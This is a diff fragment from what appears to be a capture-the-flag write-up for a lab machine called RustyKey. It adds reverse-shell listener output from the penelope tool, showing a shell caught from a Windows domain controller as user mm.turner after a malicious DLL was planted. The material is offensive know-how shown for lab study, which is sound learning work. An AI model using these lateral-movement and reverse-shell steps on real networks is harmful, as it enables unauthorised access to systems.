@@ -553,7 +553,26 @@ PS C:\Temp>
 Ill then set the value to my malicious DLL
 
 ```python
+❯❯❯ penelope -p 1338   
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.232.127 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 rustykey\mm.turner 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.232.127-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_19-18_06_37-732.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows>whoami
+whoami
+rustykey\mm.turner
 
+C:\Windows>
+```
+
+Then i can get a shell as this user
+
+# Enumeration as `mm.turner`
+
+`
 ```
 
 
